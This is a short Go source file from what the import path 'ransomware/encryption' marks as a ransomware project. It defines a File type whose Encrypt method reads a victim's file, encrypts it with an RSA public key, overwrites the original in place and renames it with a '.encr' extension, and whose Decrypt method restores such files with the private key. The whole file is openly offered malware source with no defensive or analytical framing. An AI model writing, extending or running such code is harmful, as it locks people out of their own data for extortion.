package io

import (
	"crypto/rsa"
	"os"
	enc "ransomware/encryption"
	"strings"
)

type File struct {
	Info      os.FileInfo
	Path      string
	Extension string
}

func (file *File) Encrypt(pubKey *rsa.PublicKey) error {

	osFile, err := os.Open(file.Path)
	if err != nil {
		return err
	}

	buffer := make([]byte, file.Info.Size())
	osFile.Read(buffer)
	osFile.Close()

	encrypted, err := enc.Encrypt(buffer, pubKey)
	if err != nil {
		return err
	}

	osFile, err = os.Create(file.Path)
	if err != nil {
		return err
	}
	_, err = osFile.Write(encrypted)
	if err != nil {
		return err
	}

	osFile.Close()
	os.Rename(file.Path, file.Path+".encr")

	return nil
}

func (file *File) Decrypt(privKey *rsa.PrivateKey) error {

	split := strings.Split(file.Path, ".")

	if split[len(split)-1] == "encr" {

		osFile, err := os.Open(file.Path)
		if err != nil {
			return err
		}

		buffer := make([]byte, file.Info.Size())

		osFile.Read(buffer)

		osFile.Close()

		decrypted := enc.Decrypt(buffer, privKey)

		osFile, _ = os.Create(file.Path)
		_, err = osFile.Write(decrypted)
		if err != nil {
			return err
		}

		osFile.Close()
		os.Rename(file.Path, file.Path[:len(file.Path)-4])
	}
	return nil
}
